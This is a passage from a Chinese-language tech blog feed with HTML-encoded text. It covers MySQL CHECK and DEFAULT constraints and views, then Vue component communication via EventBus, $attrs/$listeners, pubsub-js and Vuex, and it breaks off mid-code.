&#x66F4;&#x65B0;&#xFF0C;&#x5373;&#x4E3A;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x3002;&#x5916;&#x952E;&#x4E0E;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x9002;&#x7528;&#x4E8E;&#x5355;&#x673A;&#x4F4E;&#x5E76;&#x53D1;&#xFF0C;&#x4E0D;&#x9002;&#x5408;&#x5206;&#x5E03;&#x5F0F;&#x3001;&#x9AD8;&#x5E76;&#x53D1;&#x96C6;&#x7FA4;&#xFF1B;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x662F;&#x5F3A;&#x963B;&#x585E;&#xFF0C;&#x5B58;&#x5728;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x65B0;&#x98CE;&#x66B4;&#x7684;&#x98CE;&#x9669;&#xFF1B;&#x5916;&#x952E;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63D2;&#x5165;&#x901F;&#x5EA6;&#x3002;</p>
</blockquote>
<h3 id="check-constraint">CHECK Constraint</h3>
<p>CHECK &#x7EA6;&#x675F;&#x7528;&#x4E8E;&#x68C0;&#x67E5;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x662F;&#x5426;&#x7B26;&#x5408;&#x8981;&#x6C42;&#xFF0C;&#x4E00;&#x822C;&#x662F;&#x6307;&#x503C;&#x7684;&#x8303;&#x56F4;&#x3002;</p>
<p>MySQL 5.7 &#x4E2D; CHECK Constraint &#x65E0;&#x6548;&#xFF08;&#x6CA1;&#x6709;&#x9519;&#x8BEF;&#x6216;&#x8B66;&#x544A;&#x63D0;&#x793A;&#xFF09;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test10(id INT,last_name VARCHAR(15), salary DECIMAL(10,2) CHECK(salary &gt; 3000));
mysql&gt; INSERT INTO test10 VALUES(1,&apos;hz&apos;,3500);
# &#x6DFB;&#x52A0;&#x5931;&#x8D25;
mysql&gt; INSERT INTO test10 VALUES(2,&apos;hzcopy&apos;,1500); # ERROR 3819 (HY000): Check constraint &apos;test10_chk_1&apos; is violated.
</code></pre>
<h3 id="default-constraint">DEFAULT Constraint</h3>
<p>DEFAULT &#x7EA6;&#x675F;&#x7528;&#x4E8E;&#x4E3A;&#x5217;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;&#x3002;</p>
<p>&#x82E5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#x672A;&#x663E;&#x793A;&#x8D4B;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x503C;&#x5C06;&#x4F1A;&#x88AB;&#x6DFB;&#x52A0;&#x3002;</p>
<pre><code class="language-sql"># &#x5728;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x503C;
CREATE TABLE &#x8868;&#x540D;(&#x5B57;&#x6BB5; &#x7C7B;&#x578B; DEFAULT &#x9ED8;&#x8BA4;&#x503C;);
</code></pre>
<pre><code class="language-sql"># &#x5728;&#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x503C;
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; DEFAULT &#x9ED8;&#x8BA4;&#x503C;;
</code></pre>
<pre><code class="language-sql"># &#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x503C;
mysql&gt; ALTER TABLE test12 MODIFY salary DECIMAL (10,2);
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E8%B1%A1">&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;</h2>
<table>
<thead>
<tr>
<th style="text-align:center">&#x5E38;&#x89C1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;</th>
<th style="text-align:center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x8868; TABLE</td>
<td style="text-align:center">&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x903B;&#x8F91;&#x5355;&#x5143;&#xFF0C;&#x4EE5;&#x884C;&#x548C;&#x5217;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x5728;&#xFF0C;&#x5217;&#x5C31;&#x662F;&#x5B57;&#x6BB5;&#xFF0C;&#x884C;&#x5C31;&#x662F;&#x8BB0;&#x5F55;</td>
</tr>
<tr>
<td style="text-align:center">&#x6570;&#x636E;&#x5B57;&#x5178;</td>
<td style="text-align:center">&#x5B58;&#x653E;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x7684;&#x7CFB;&#x7EDF;&#x8868; =&gt; &#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x6570;&#x636E;&#x901A;&#x5E38;&#x7531;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x7EF4;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x5458;&#x901A;&#x5E38;&#x4E0D;&#x5E94;&#x8BE5;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x53EF;&#x67E5;&#x770B;</td>
</tr>
<tr>
<td style="text-align:center">&#x7EA6;&#x675F; CONSTRAINT</td>
<td style="text-align:center">&#x6267;&#x884C;&#x6570;&#x636E;&#x6821;&#x9A8C;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x7528;&#x4E8E;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x89C4;&#x5219;</td>
</tr>
<tr>
<td style="text-align:center">&#x89C6;&#x56FE; VIEW</td>
<td style="text-align:center">&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x91CC;&#x6570;&#x636E;&#x7684;&#x903B;&#x8F91;&#x663E;&#x793A;&#xFF1B;&#x89C6;&#x56FE;&#x5E76;&#x4E0D;&#x5B58;&#x50A8;&#x6570;&#x636E;</td>
</tr>
<tr>
<td style="text-align:center">&#x7D22;&#x5F15; INDEX</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4E66;&#x7684;&#x76EE;&#x5F55;</td>
</tr>
<tr>
<td style="text-align:center">&#x5B58;&#x50A8;&#x8FC7;&#x7A0B; PROCEDURE</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x5B8C;&#x6574;&#x7684;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4F46;&#x53EF;&#x901A;&#x8FC7;&#x4F20;&#x51FA;&#x53C2;&#x6570;&#x5C06;&#x591A;&#x4E2A;&#x503C;&#x4F20;&#x7ED9;&#x8C03;&#x7528;&#x73AF;&#x5883;</td>
</tr>
<tr>
<td style="text-align:center">&#x5B58;&#x50A8;&#x51FD;&#x6570; FUNCTION</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x7279;&#x5B9A;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x5177;&#x6709;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x503C;</td>
</tr>
<tr>
<td style="text-align:center">&#x89E6;&#x53D1;&#x5668; TRIGGER</td>
<td style="text-align:center">&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5668;&#xFF0C;&#x5F53;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x751F;&#x7279;&#x5B9A;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#xFF0C;&#x5B8C;&#x6210;&#x76F8;&#x5E94;&#x7684;&#x5904;&#x7406;</td>
</tr>
</tbody>
</table>
<h3 id="%E8%A7%86%E5%9B%BE">&#x89C6;&#x56FE;</h3>
<p>&#x89C6;&#x56FE;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8868;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x9700;&#x6C42;&#x5236;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x89C6;&#x56FE;&#xFF0C;&#x5373;&#x9488;&#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x4EBA;&#x5458;&#x53EA;&#x5C55;&#x793A;&#x90E8;&#x5206;&#x7684;&#x6570;&#x636E;&#x3002;&#x672C;&#x8D28;&#x662F;&#x4E00;&#x6BB5;&#x5B58;&#x50A8;&#x8D77;&#x6765;&#x7684; SELECT&#x3002;</p>
<p>&#x89C6;&#x56FE;&#x5EFA;&#x7ACB;&#x5728;&#x5DF2;&#x6709;&#x8868;&#xFF08;&#x57FA;&#x8868;&#xFF09;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x865A;&#x62DF;&#x8868;&#xFF0C;&#x672C;&#x8EAB;&#x4E0D;&#x5177;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5360;&#x7528;&#x5F88;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x3002;&#x89C6;&#x56FE;&#x7684;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x53EA;&#x5F71;&#x54CD;&#x89C6;&#x56FE;&#x672C;&#x8EAB;&#xFF0C;&#x4E0D;&#x5F71;&#x54CD;&#x5BF9;&#x5E94;&#x7684;&#x57FA;&#x8868;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x5BF9;&#x89C6;&#x56FE;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x53D1;&#x751F;&#x76F8;&#x5E94;&#x53D8;&#x5316;&#xFF0C;&#x53CD;&#x4E4B;&#x4EA6;&#x7136;&#x3002;</p>
<ul>
<li>&#x521B;&#x5EFA;&#x89C6;&#x56FE;</li>
</ul>
<pre><code class="language-sql"># &#x5728; CREATE VIEW &#x8BED;&#x53E5;&#x4E2D;&#x5D4C;&#x5165;&#x5B50;&#x67E5;&#x8BE2;
CREATE [OR REPLACE] [ALGORITHM = {UNDEFINED | MERGE | TEMPTABLE}] VIEW &#x89C6;&#x56FE;&#x540D;&#x79F0; [(&#x5B57;&#x6BB5;&#x5217;&#x8868;)] AS &#x67E5;&#x8BE2;&#x8BED;&#x53E5; [WITH [CASCADED|LOCAL] CHECK OPTION]
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[组件通讯]]></title><description><![CDATA[Vuex|Redux|Pinia]]></description><link>yourdomain.com/zu-jian-tong-xun/</link><guid isPermaLink="false">6264eec5aa2820757fbb1454</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Fri, 01 Oct 2021 13:09:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/treecommunicate.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%B0%B1%E5%9C%B0%E5%8F%96%E6%9D%90">&#x5C31;&#x5730;&#x53D6;&#x6750;</h2>
<h3 id="%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF-eventbus">&#x5168;&#x5C40;&#x4E8B;&#x4EF6;&#x603B;&#x7EBF; EventBus</h3>
<img src="yourdomain.com/content/images/2022/04/treecommunicate.jpg" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;"><p>&#x5C06; Vue &#x5B9E;&#x4F8B;&#x8D4B;&#x503C;&#x7ED9; Vue &#x663E;&#x5F0F;&#x539F;&#x578B;&#x4E0A;&#x589E;&#x52A0;&#x7684; $EventBus &#x5C5E;&#x6027;&#xFF0C;&#x540E;&#x7EED;&#x6240;&#x6709;&#x7684;&#x901A;&#x4FE1;&#x6570;&#x636E;&#x548C;&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x4E0A;&#x3002;&#x5728;&#x8303;&#x56F4;&#x8F83;&#x5C0F;&#x65F6;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;&#x4F5C;&#x4E3A;&#x4E8B;&#x4EF6;&#x4E2D;&#x5FC3;&#x3002;</p>
<pre><code class="language-javascript">Vue.prototype.$eventBus = new Vue() // main.js
this.$eventBus.$emit(&apos;eventTarget&apos;,&apos;eventTargetVal&apos;) // &#x4F20;&#x503C;&#x7EC4;&#x4EF6;
this.$eventBus.$on(&apos;eventTarget&apos;, (val) =&gt; { ...val })// &#x63A5;&#x6536;&#x7EC4;&#x4EF6;
this.$eventBus.$off(&apos;eventTarget&apos;) // &#x9500;&#x6BC1;&#x4E8B;&#x4EF6;
</code></pre>
<h3 id="%E9%80%89%E9%A1%B9%E5%92%8C%E5%AE%9E%E4%BE%8B-property">&#x9009;&#x9879;&#x548C;&#x5B9E;&#x4F8B; Property</h3>
<ul>
<li><a href="https://v2.cn.vuejs.org/v2/api/#inheritAttrs">inheritAttrs</a> =&gt; &#x62B9;&#x53BB;&#x76F4;&#x63A5;&#x7ED1;&#x5B9A;&#x5B50;&#x7EC4;&#x4EF6;&#x6839;&#x5143;&#x7D20;&#x4E0A;&#x672A;&#x4F5C;&#x4E3A; props &#x7684; attribute</li>
</ul>
<pre><code class="language-js">export default {
  inheritAttrs: false, ...
}
</code></pre>
<ul>
<li>
<p><a href="https://v2.cn.vuejs.org/v2/api/#vm-attrs">vm.$attrs</a> =&gt; &#x7236;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x4E0D;&#x88AB; prop &#x83B7;&#x53D6;&#x7684; attribute &#x7ED1;&#x5B9A;</p>
</li>
<li>
<p><a href="https://v2.cn.vuejs.org/v2/api/#vm-listeners">vm.$listeners</a> =&gt; &#x5305;&#x542B;&#x7236;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x4E0D;&#x542B; .native &#x4FEE;&#x9970;&#x5668;&#x7684; v-on &#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5668;</p>
</li>
</ul>
<p>vm.$attrs &#x4E0E; vm.$listeners &#x53EF;&#x5206;&#x522B;&#x901A;&#x8FC7; v-bind=&quot;$attrs&quot; &#x548C; v-on=&quot;$listeners&quot; &#x4F20;&#x5165;&#x5185;&#x90E8;&#x7EC4;&#x4EF6;&#x3002;&#x5185;&#x90E8;&#x7EC4;&#x4EF6;&#x53EF;&#x901A;&#x8FC7; this.$emit(&apos;XXX&apos;) &#x76F4;&#x63A5;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7684;&#x4E8B;&#x4EF6;&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;
    SupComponent
    &lt;AttrsListenerTest ok=&quot;ok&quot; okk=&quot;okk&quot; okkk=&quot;okkk&quot; @supHandler01=&quot;supHandler01&quot; v-on:supHandler02=&quot;supHandler02&quot;&gt;&lt;/AttrsListenerTest&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import AttrsListenerTest from &apos;@/components/AttrsListenerTest.vue&apos;
export default {
  components: { AttrsListenerTest },
  methods: {
    supHandler01 () { console.log(&apos;super func 01&apos;) },
    supHandler02 () { console.log(&apos;super func 02&apos;) }
  }
}
&lt;/script&gt;
</code></pre>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;
    AttrsListenerTest
    &lt;SubAttrsListenerTest v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;/&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import SubAttrsListenerTest from &apos;@/components/SubAttrsListenerTest.vue&apos;
export default {
  inheritAttrs: false, // &#x62B9;&#x53BB;&#x7ED1;&#x5B9A;&#x5728;&#x6839;&#x5143;&#x7D20;&#x4E0A;&#x7684; $attrs &#x5C5E;&#x6027;
  name: &apos;AttrsListenerTest&apos;,
  props: { ok: { type: String } },
  mounted () {
    console.log(this.$attrs) // {okk: &apos;okk&apos;, okkk: &apos;okkk&apos;}
    console.log(this.$listeners) // {supHandler01: &#x192;, supHandler02: &#x192;}
  },
  components: { SubAttrsListenerTest }
}
&lt;/script&gt;
</code></pre>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;SubAttrsListenerTest&lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
export default {
  name: &apos;SubAttrsListenerTest&apos;,
  props: { okk: { type: String } },
  mounted () {
    console.log(this.$attrs) // {okkk: &apos;okkk&apos;}
    console.log(this.$listeners) // {supHandler01: &#x192;, supHandler02: &#x192;}
  }
}
&lt;/script&gt;
</code></pre>
<h3 id="%E9%80%89%E9%A1%B9%E5%92%8C%E5%AE%9E%E4%BE%8B">&#x9009;&#x9879;&#x548C;&#x5B9E;&#x4F8B;</h3>
<ul>
<li><a href="https://v2.cn.vuejs.org/v2/api/#parent">vm.$parent</a> =&gt; &#x6307;&#x5B9A;&#x5DF2;&#x521B;&#x5EFA;&#x7684;&#x5B9E;&#x4F8B;&#x7684;&#x7236;&#x5B9E;&#x4F8B;</li>
</ul>
<p>&#x5B50;&#x7EC4;&#x4EF6;&#x5728;&#x6302;&#x8F7D;&#x5B8C;&#x6210;&#x540E;&#x53EF;&#x901A;&#x8FC7; <code>this.$parent</code> &#x62FF;&#x5230;&#x5176;&#x7236;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#xFF0C;&#x548C;&#x7236;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#x4E0A;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x65B9;&#x6CD5;&#x3002;</p>
<ul>
<li><a href="https://v2.cn.vuejs.org/v2/api/#vm-children">vm.$children</a> =&gt; &#x5F53;&#x524D;&#x5B9E;&#x4F8B;&#x7684;&#x76F4;&#x63A5;&#x5B50;&#x7EC4;&#x4EF6;</li>
</ul>
<p>&#x7236;&#x7EC4;&#x4EF6;&#x5728;&#x6302;&#x8F7D;&#x5B8C;&#x6210;&#x540E;&#x53EF;&#x901A;&#x8FC7; <code>this.$children</code> &#x62FF;&#x5230;&#x4E00;&#x7EA7;&#x5B50;&#x7EC4;&#x4EF6;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x65B9;&#x6CD5;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6539;&#x53D8; data &#x6216;&#x8C03;&#x7528; methods &#x65B9;&#x6CD5;&#x3002;</p>
<ul>
<li><a href="https://v2.cn.vuejs.org/v2/api/#vm-refs">vm.$refs</a> =&gt; &#x542B;&#x6CE8;&#x518C;&#x8FC7; ref attribute &#x7684;&#x6240;&#x6709;<u> DOM &#x5143;&#x7D20;</u>&#x548C;<u>&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;</u>&#x7684;&#x5BF9;&#x8C61;</li>
<li><a href="https://v2.cn.vuejs.org/v2/api/#vm-root">vm.$root</a> =&gt; &#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#x6811;&#x7684;&#x6839; Vue &#x5B9E;&#x4F8B;</li>
</ul>
<p>&#x6240;&#x6709;&#x7EC4;&#x4EF6;&#x6700;&#x7EC8;&#x90FD;&#x4F1A;&#x6302;&#x8F7D;&#x5230;&#x6839;&#x5B9E;&#x4F8B;&#x4E0A;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x6839;&#x5B9E;&#x4F8B;&#x7684; $children &#x83B7;&#x53D6;&#x5B50;&#x7EC4;&#x4EF6;&#x3002;</p>
<pre><code class="language-javascript">this.$root // &#x6839;&#x5B9E;&#x4F8B;
this.$root.$children[0] // &#x6839;&#x5B9E;&#x4F8B;&#x7684;&#x4E00;&#x7EA7;&#x5B50;&#x7EC4;&#x4EF6;
this.$root.$children[0].$children[0] // &#x6839;&#x5B9E;&#x4F8B;&#x7684;&#x4E8C;&#x7EA7;&#x5B50;&#x7EC4;&#x4EF6;
</code></pre>
<ul>
<li><a href="https://v2.cn.vuejs.org/v2/guide/components-props.html#%E5%8D%95%E5%90%91%E6%95%B0%E6%8D%AE%E6%B5%81">&#x5355;&#x5411;&#x6570;&#x636E;&#x6D41;</a>&#x548C; <a href="https://v2.cn.vuejs.org/v2/guide/components-custom-events.html#sync-%E4%BF%AE%E9%A5%B0%E7%AC%A6">.sync &#x4FEE;&#x9970;&#x7B26;</a></li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="pubsub-js">pubsub-js</h2>
<p>&#x540C;&#x6837;&#x9002;&#x7528;&#x4E8E;&#x4EFB;&#x610F;&#x7EC4;&#x4EF6;&#x95F4;&#x7684;&#x901A;&#x8BAF;&#x65B9;&#x5F0F;&#xFF0C;&#x6D88;&#x606F;&#x8BA2;&#x9605;&#x4E0E;&#x53D1;&#x5E03;&#x3002;&#x7531;&#x4E8E;&#x94FA;&#x5929;&#x76D6;&#x5730;&#x7684;&#x76F8;&#x5173;&#x5E93;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x8BF4; <a href="https://github.com/mroderick/PubSubJS">PubSubJS</a>&#x3002;</p>
<pre><code class="language-shell"># &#x5B89;&#x88C5; pubsub
npm i pubsub-js
</code></pre>
<iframe src="https://codesandbox.io/embed/vuecomponentscomunicate-f28mq?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="vueComponentsComunicate" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="vuex">Vuex</h2>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/vuex.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<h3 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h3>
<ul>
<li>&#x5B89;&#x88C5;&#x4E0E;&#x4F7F;&#x7528;</li>
</ul>
<p>VueCLI &#x52FE;&#x9009; Vuex &#x9009;&#x9879;&#x540E;&#xFF0C;&#x521B;&#x5EFA;&#x9879;&#x76EE;&#x65F6;&#x4F1A;&#x5728; src &#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210; store &#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B; index.ts &#x6587;&#x4EF6;&#x3002;main.js|ts &#x4F1A;&#x5F15;&#x5165; store &#x8FDB;&#x884C;&#x5168;&#x5C40;&#x6CE8;&#x6D4B;&#xFF0C;&#x65B9;&#x4FBF;&#x901A;&#x8FC7; this.$store &#x8BBF;&#x95EE;&#x3002;&#x9879;&#x76EE;&#x9636;&#x6BB5;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E5F;&#x53EF;&#x4F7F;&#x7528; <code>npm install vuex@next --save</code> &#x5B89;&#x88C5;&#x3002;</p>
<pre><code class="language-javascript">// src/store/index.js =&gt; vue2
import Vue from &apos;vue&apos;
import Vuex from &apos;vuex&apos;
Vue.use(Vuex)
export default new Vuex.Store({ state: {}, mutations: {}, actions: {}, modules: {} })

// src/store/index.ts =&gt; vue3
import { createStore } from &apos;vuex&apos;
export default createStore({ state: {}, mutations: {}, actions: {}, modules: {} })
</code></pre>
<pre><code class="language-javascript">// vue2 =&gt; main.js
import store from &apos;./store&apos;
new Vue({
  el: &apos;#app&apos;, router,
  store, // &#x4F7F;&#x7528; store
  template: &apos;&lt;App/&gt;&apos;, components: { App }
})
// vue3 =&gt; main.ts
import store from &apos;./store&apos;
...
createApp(App).use(store).use(router).mount(&apos;#app&apos;)
</code></pre>
<ul>
<li>State =&gt; &#x552F;&#x4E00;&#x6570;&#x636E;&#x6E90; -&gt; SSOT</li>
</ul>
<p>Vuex &#x4F7F;&#x7528;&#x5355;&#x4E00;&#x72B6;&#x6001;&#x6811;&#xFF0C;&#x9ED8;&#x8BA4;&#x5E94;&#x7528;&#x4EC5;&#x5305;&#x542B;&#x4E00;&#x4E2A; Store &#x5B9E;&#x4F8B;&#xFF0C;&#x5373;&#x7528;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x5305;&#x542B;&#x5168;&#x90E8;&#x7684;&#x5E94;&#x7528;&#x5C42;&#x7EA7;&#x72B6;&#x6001;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5B58;&#x50A8;&#x5728; Vuex &#x4E2D;&#x7684;&#x6570;&#x636E;&#x548C; Vue &#x5B9E;&#x4F8B;&#x4E2D;&#x7684; data &#x9075;&#x5FAA;&#x76F8;&#x540C;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5373;&#x72B6;&#x6001;&#x5BF9;&#x8C61;&#x5FC5;&#x987B;&#x662F;&#x7EAF;&#x7CB9; plain &#x7684;&#xFF08;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#xFF09;&#x3002;</p>
<p>&#x7EC4;&#x4EF6;&#x8BBF;&#x95EE; State &#x4E2D;&#x7684;&#x6570;&#x636E;&#x53EF;&#x901A;&#x8FC7; <code>this.$store.state.&#x5168;&#x5C40;&#x6570;&#x636E;&#x540D;&#x79F0;</code> &#x6216; mapState &#x8F85;&#x52A9;&#x51FD;&#x6570;&#x3002;&#x540E;&#x8005;&#x662F;&#x5728; Vue &#x7EC4;&#x4EF6;&#x8BFB;&#x53D6; Vuex &#x6570;&#x636E;&#x72B6;&#x6001;&#x65F6;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x548C;&#x5197;&#x4F59;&#x7684;&#x58F0;&#x660E;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#xFF0C;&#x80FD;&#x63A5;&#x6536;&#x5BF9;&#x8C61;&#x6216;&#x6570;&#x7EC4;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x3002;</p>
<ul>
<li>Getter =&gt; store &#x4E2D;&#x7684; getters =&gt; &#x6D3E;&#x751F; state &#x5374;&#x4E0D;&#x4FEE;&#x6539;&#x539F; state</li>
</ul>
<p>&#x5BF9;&#x4E8E; store &#x7684; state &#x6765;&#x8BF4;&#xFF0C;&#x662F;&#x591A;&#x4E2A;&#x7EC4;&#x4EF6;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#x624D;&#x4F1A;&#x653E;&#x5165;&#x3002;&#x90A3;&#x4E48;&#x540C;&#x6837;&#x7684; state &#x6D3E;&#x751F;&#x72B6;&#x6001;&#x4E5F;&#x9002;&#x5408;&#x8FDB;&#x884C;&#x62BD;&#x53D6;&#x5C01;&#x88C5;&#x3002;store &#x4E2D;&#x5B9A;&#x4E49; getters &#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F; store &#x7684;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x3002;</p>
<pre><code class="language-javascript">const store = createStore({
  state: {
    administrative_staff: [
      { id: 1, name: &apos;...&apos;, del_flag: true }, { id: 2, name: &apos;...&apos;, del_flag: false }
    ]
  },
  getters: {
    delAccountGet (state) {
      return state.administrative_staff.filter(p =&gt; p.done)
    }
  }
})
</code></pre>
<p>getters &#x4F1A;&#x9ED8;&#x8BA4;&#x66B4;&#x9732;&#x4E3A; store.getters &#x5BF9;&#x8C61;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x5C5E;&#x6027;&#x5F62;&#x5F0F;&#x8BBF;&#x95EE;&#xFF1B;&#x4E14; getters &#x5141;&#x8BB8;&#x4E92;&#x76F8;&#x4F7F;&#x7528;&#xFF0C;getters &#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5177;&#x4F53; getters &#x65B9;&#x6CD5;&#xFF0C;&#x5373; getter &#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4F20;&#x5165;&#x3002;</p>
<pre><code class="language-javascript">getters: {
  // ...
